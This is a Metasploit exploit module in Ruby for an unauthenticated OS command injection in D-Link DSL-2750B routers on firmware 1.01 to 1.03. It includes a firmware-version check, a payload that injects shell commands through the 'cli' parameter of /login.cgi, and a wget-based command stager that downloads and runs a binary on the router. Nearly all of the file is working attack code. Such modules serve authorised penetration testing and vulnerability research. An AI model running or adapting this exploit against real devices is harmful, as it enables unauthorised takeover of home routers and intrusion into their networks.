# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;D-Link DSL-2750B OS Command Injection&#039;,
      &#039;Description&#039;    => %q(
        This module exploits a remote command injection vulnerability in D-Link DSL-2750B devices.
        Vulnerability can be exploited through "cli" parameter that is directly used to invoke
        "ayecli" binary. Vulnerable firmwares are from 1.01 up to 1.03.
      ),
      &#039;Author&#039;         =>
        [
          &#039;p@ql&#039;, # vulnerability discovery
          &#039;Marcin Bury <marcin[at]threat9.com>&#039; # metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;PACKETSTORM&#039;, 135706],
          [&#039;URL&#039;, &#039;http://seclists.org/fulldisclosure/2016/Feb/53&#039;],
          [&#039;URL&#039;, &#039;http://www.quantumleap.it/d-link-router-dsl-2750b-firmware-1-01-1-03-rce-no-auth/&#039;]
        ],
      &#039;Targets&#039;        =>
        [
          [
            &#039;Linux mipsbe Payload&#039;,
            {
              &#039;Arch&#039; => ARCH_MIPSBE,
              &#039;Platform&#039; => &#039;linux&#039;
            }
          ],
          [
            &#039;Linux mipsel Payload&#039;,
            {
              &#039;Arch&#039; => ARCH_MIPSLE,
              &#039;Platform&#039; => &#039;linux&#039;
            }
          ]
        ],
      &#039;DisclosureDate&#039;  => &#039;Feb 5 2016&#039;,
      &#039;DefaultTarget&#039;   => 0))

    deregister_options(&#039;CMDSTAGER::FLAVOR&#039;)
  end

  def check
    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => &#039;/ayefeaturesconvert.js&#039;
    )

    unless res
      vprint_error(&#039;Connection failed&#039;)
      return CheckCode::Unknown
    end

    unless res.code.to_i == 200 && res.body.include?(&#039;DSL-2750&#039;)
      vprint_status(&#039;Remote host is not a DSL-2750&#039;)
      return CheckCode::Safe
    end

    if res.body =~ /var AYECOM_FWVER="(\d.\d+)";/
      version = Regexp.last_match[1]
      vprint_status("Remote host is a DSL-2750B with firmware version #{version}")
      if version >= "1.01" && version <= "1.03"
        return Exploit::CheckCode::Appears
      end
    end

    CheckCode::Safe
  rescue ::Rex::ConnectionError
    vprint_error(&#039;Connection failed&#039;)
    return CheckCode::Unknown
  end

  def execute_command(cmd, _opts)
    payload = Rex::Text.uri_encode("multilingual show&#039;;#{cmd}&#039;")
    send_request_cgi(
      {
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039; => &#039;/login.cgi&#039;,
        &#039;vars_get&#039; => {
          &#039;cli&#039; => "#{payload}$"
        },
        &#039;encode_params&#039; => false
      },
      5
    )
  rescue ::Rex::ConnectionError
    fail_with(Failure::Unreachable, "#{peer} Failed to connect to the web server")
  end

  def exploit
    print_status("#{peer} Checking target version...")

    unless check == Exploit::CheckCode::Appears
      fail_with(Failure::NotVulnerable, &#039;Target is not vulnerable&#039;)
    end

    execute_cmdstager(
      flavor: :wget,
      linemax: 200
    )
  end
end

